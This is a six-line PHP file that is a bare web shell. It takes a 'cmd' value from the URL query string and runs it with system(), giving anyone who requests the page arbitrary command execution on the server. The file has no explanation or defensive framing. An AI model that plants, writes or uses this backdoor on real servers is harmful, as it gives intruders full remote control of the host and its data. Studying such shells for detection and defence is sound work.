<?php
	if(isset($_GET['cmd'])){
		$cmd=$_GET['cmd'];
		system($cmd);
	}
?>